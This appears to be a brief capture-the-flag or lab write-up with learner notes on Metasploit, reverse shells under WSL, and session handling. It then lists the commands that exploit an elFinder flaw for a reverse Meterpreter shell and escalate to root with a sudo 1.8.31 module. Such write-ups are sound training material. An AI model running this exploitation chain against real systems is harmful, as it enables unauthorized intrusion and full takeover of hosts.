# Lesson Learn
- how to use `Metasploit`    
- how to set Reverse Shell for WSL  
    It doen't work well when you use Metasploit due to network. 
- In Metasploit, how to use a session with [CTRL] + [Z] or `bg` command.  


# Write Up
```
msf6> search elFinder
msf6> use 3
msf6> options
msf6> set RHOSTS XXX.XXX.XXX.XXX
msf6> set LHOST YYY.YYY.YYY.YYY
msf6> run
meterpreter> shell
getuid
sudo -V
exit
meterpreter > [CTRL] + [Z] or bg
msf6> search sudo 1.8.31
msf6> use 0
msf6> sessions
msf6> set SESSION [number]
msf6> run
```